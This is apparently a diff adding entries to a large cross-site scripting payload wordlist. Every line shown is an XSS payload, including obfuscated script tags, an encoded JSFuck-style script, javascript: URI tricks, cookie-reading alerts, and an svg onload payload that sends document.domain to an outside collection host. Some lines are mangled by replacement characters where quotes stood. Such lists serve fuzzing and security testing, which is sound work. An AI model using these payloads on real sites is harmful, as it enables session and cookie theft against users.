@@ -20908,3 +20908,14 @@ zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
 嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
 嘾嘾<script>alert(2);</script>
+‘>alert(154)</script><script/154=’;;;;;;;
+<ScriPt>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</sCripT>
+<<SCRIPT>alert(�XSS�);//<</SCRIPT>
+<IMG SRC=�jav ascript:alert(�XSS�);�>
+<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>
+${alert(1)}`
+<a data-orig-ref=" alert(1)" data-orig-proto="javascript" href="javascript:// alert(1)">clickme</a>
+<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
+<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�
+�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+�><s�%2b�cript>alert(document.cookie)</script>
